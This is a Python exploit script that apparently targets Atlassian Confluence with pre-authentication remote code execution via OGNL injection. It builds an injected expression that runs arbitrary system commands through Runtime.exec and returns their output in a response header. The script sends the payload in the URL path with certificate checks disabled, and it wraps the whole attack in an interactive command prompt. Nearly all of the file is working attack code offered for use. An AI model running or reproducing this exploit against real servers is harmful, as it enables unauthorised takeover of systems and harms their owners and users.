#!/usr/bin/env python3
import sys
import urllib3
import requests
import argparse
from requests.exceptions import InvalidSchema
from rich import print
from rich.prompt import Prompt
from urllib.parse import quote


# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Save options in a global dict
opt = dict()


def gen_payload(cmd: str):
    """Generate Payload for RCE"""

    payload = '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("' + cmd + '").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}'
    payload = quote(payload)
    return payload


def check_args(cmd_args):
    """Check command line arguments for any sort of funny business"""

    # Start with checking the URL
    try:
        resp = requests.get(cmd_args.url, verify=False)
        if resp.ok:
            opt['url'] = cmd_args.url
        else:
            raise resp.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(":x:", f"[bold][red]Exception occured as:[/bold][/red] {e}", file = sys.stderr)
        sys.exit(-1)

    #Just print the arguments after parsing
    print(":link:", f"[bold]URL:[/bold] {opt['url']}")


def run_cmd(cmd):
    payload = gen_payload(cmd)
    url = opt['url'] + '/' + payload + '/'
    try:
        resp = requests.get(url, timeout=5, verify=False, allow_redirects=False)
        if 'X-Cmd-Response' not in resp.headers:
            print(":x:", "Could not find the Response Headers", file = sys.stderr)
            return 0
        print(resp.headers['X-Cmd-Response'])
        return 1
    except requests.exceptions.RequestException:
        print(":x:", "Request failed :(", file = sys.stderr)
        return -1


def start_prompt():
    """Start An Interactive Prompt"""
    try:
        while True:
            cmd = Prompt.ask(":point_right:", default="id")
            if (cmd.lower() == "quit" or cmd.lower() == "exit"):
                sys.exit(0)
            run_cmd(cmd)
    except KeyboardInterrupt:
        print()
        print(":x:", "[bold][red]Exiting![/red][/bold]")
        sys.exit(0)


def main():
    """Main Function"""

    parser = argparse.ArgumentParser(description="[+] Confluence Pre-Auth Remote Code Execution via OGNL Injection Exploit")
    parser.add_argument('-u', '--url', required=True,
                        help = "Base URL")
    check_args(parser.parse_args())

    start_prompt()


if __name__ == '__main__':
    main()
